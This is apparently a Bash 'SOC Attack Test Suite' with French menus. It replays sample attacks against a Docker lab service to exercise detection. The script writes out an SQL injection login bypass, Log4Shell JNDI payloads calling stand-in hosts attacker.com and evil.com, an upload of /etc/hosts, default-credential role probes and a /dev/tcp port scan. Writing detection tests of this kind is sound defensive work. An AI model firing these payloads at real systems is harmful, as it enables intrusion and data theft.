#!/usr/bin/env bash
set -euo pipefail

COMPOSE_BIN="docker compose"
CURL_SVC="curl"
BASE_URL="http://server-app"
LDAP_HOST_1="attacker.com"
LDAP_HOST_2="evil.com"

dc_exec() {
  $COMPOSE_BIN exec -T "$1" "${@:2}"
}

print_header() {
  clear || true
  echo "   _____                      _ _         "
  echo "  / ____|                    (_) |        "
  echo " | (___   ___  ___ _   _ _ __ _| |_ _   _ "
  echo "  \\___ \\ / _ \\/ __| | | | '__| | __| | | |"
  echo "  ____) |  __/ (__| |_| | |  | | |_| |_| |"
  echo " |_____/ \\___|\\___|\\__,_|_|  |_|\\__|\\__, |"
  echo "                                     __/ |"
  echo "                                    |___/ "
  echo
  echo "SOC Attack Test Suite"
  echo "Compose : $COMPOSE_BIN"
  echo "Service : $CURL_SVC"
  echo "Base URL: $BASE_URL"
  echo
}

test_sqli_name="SQL Injection"
test_struts_name="Apache Struts2 style POST"
test_log4shell_q_name="Log4Shell via query string"
test_log4shell_ua_name="Log4Shell via User-Agent"
test_roles_name="Tests d'acces roles"
test_dns_name="Trafic DNS / HTTP sortant"
test_scan_ports_name="Scan de ports simple"

test_sqli() {
  echo "[+] SQL Injection"
  dc_exec "$CURL_SVC" curl -sS "${BASE_URL}/login?user=admin&pass=%27%20OR%201%3D1" >/dev/null || true
  echo "[OK] Test termine"
}

test_struts() {
  echo "[+] Apache Struts2 style POST"
  dc_exec "$CURL_SVC" curl -sS -X POST \
    -H "Content-Type: multipart/form-data" \
    -F "file=@/etc/hosts" \
    "${BASE_URL}/" >/dev/null || true
  echo "[OK] Test termine"
}

test_log4shell_q() {
  echo "[+] Log4Shell via query string"
  dc_exec "$CURL_SVC" curl -sS \
    "${BASE_URL}/search?q=\${jndi:ldap://${LDAP_HOST_1}/lab_test}" >/dev/null || true
  echo "[OK] Test termine"
}

test_log4shell_ua() {
  echo "[+] Log4Shell via User-Agent"
  dc_exec "$CURL_SVC" curl -sS \
    -H "User-Agent: \${jndi:ldap://${LDAP_HOST_2}/lab_test}" \
    "${BASE_URL}/" >/dev/null 2>&1 || true
  echo "[OK] Test termine"
}

test_roles() {
  echo "[+] Tests d'acces roles"

  echo "  - employee -> /employee"
  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/employee" >/dev/null || true

  echo "  - employee -> /user"
  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/user" >/dev/null || true

  echo "  - employee -> /admin"
  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/admin" >/dev/null || true

  echo "  - admin -> /employee"
  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/employee" >/dev/null || true

  echo "  - admin -> /user"
  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/user" >/dev/null || true

  echo "  - admin -> /admin"
  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/admin" >/dev/null || true

  echo "  - user -> /user"
  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/user" >/dev/null || true

  echo "  - user -> /employee"
  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/employee" >/dev/null || true

  echo "  - user -> /admin"
  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/admin" >/dev/null || true

  echo "[OK] Test termine"
}

test_dns() {
  echo "[+] Trafic DNS / HTTP sortant"
  dc_exec "$CURL_SVC" curl -sS http://google.com >/dev/null || true
  echo "[OK] Test termine"
}

test_scan_ports() {
  echo "[+] Scan de ports simple"
  for port in 80 443 9200 3001; do
    echo "  - test port $port"
    dc_exec "$CURL_SVC" bash -c "timeout 1 bash -c '</dev/tcp/server-app/$port'" >/dev/null 2>&1 || true
  done
  echo "[OK] Test termine"
}

run_all() {
  test_sqli
  test_struts
  test_log4shell_q
  test_log4shell_ua
  test_roles
  test_dns
  test_scan_ports
}

show_list() {
  echo
  echo "Tests disponibles :"
  echo "  -1   $test_sqli_name"
  echo "  -2   $test_struts_name"
  echo "  -3   $test_log4shell_q_name"
  echo "  -4   $test_log4shell_ua_name"
  echo "  -5   $test_roles_name"
  echo "  -6   $test_dns_name"
  echo "  -7   $test_scan_ports_name"
  echo "  -99  Tout lancer"
  echo
}

pause_screen() {
  echo
  read -rp "Appuyez sur Entree pour continuer..." _
}

interactive_menu() {
  while true; do
    print_header
    echo "Choisissez un test :"
    echo
    echo "  1) $test_sqli_name"
    echo "  2) $test_struts_name"
    echo "  3) $test_log4shell_q_name"
    echo "  4) $test_log4shell_ua_name"
    echo "  5) $test_roles_name"
    echo "  6) $test_dns_name"
    echo "  7) $test_scan_ports_name"
    echo "  99) Tout lancer"
    echo "  0) Quitter"
    echo

    read -rp "Votre choix : " choice
    echo

    case "$choice" in
      1) test_sqli; pause_screen ;;
      2) test_struts; pause_screen ;;
      3) test_log4shell_q; pause_screen ;;
      4) test_log4shell_ua; pause_screen ;;
      5) test_roles; pause_screen ;;
      6) test_dns; pause_screen ;;
      7) test_scan_ports; pause_screen ;;
      99) run_all; pause_screen ;;
      0) exit 0 ;;
      *) echo "Choix invalide."; pause_screen ;;
    esac
  done
}

ARGS=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    --compose) COMPOSE_BIN="$2"; shift 2 ;;
    --svc) CURL_SVC="$2"; shift 2 ;;
    --base) BASE_URL="$2"; shift 2 ;;
    --ldap1) LDAP_HOST_1="$2"; shift 2 ;;
    --ldap2) LDAP_HOST_2="$2"; shift 2 ;;
    --list|-l|--help|-h) show_list; exit 0 ;;
    *) ARGS+=("$1"); shift ;;
  esac
done

set -- "${ARGS[@]}"

if [[ $# -eq 0 ]]; then
  interactive_menu
fi

for arg in "$@"; do
  case "$arg" in
    -1) test_sqli ;;
    -2) test_struts ;;
    -3) test_log4shell_q ;;
    -4) test_log4shell_ua ;;
    -5) test_roles ;;
    -6) test_dns ;;
    -7) test_scan_ports ;;
    -99) run_all ;;
    *) echo "Argument inconnu : $arg" >&2; show_list; exit 1 ;;
  esac
done
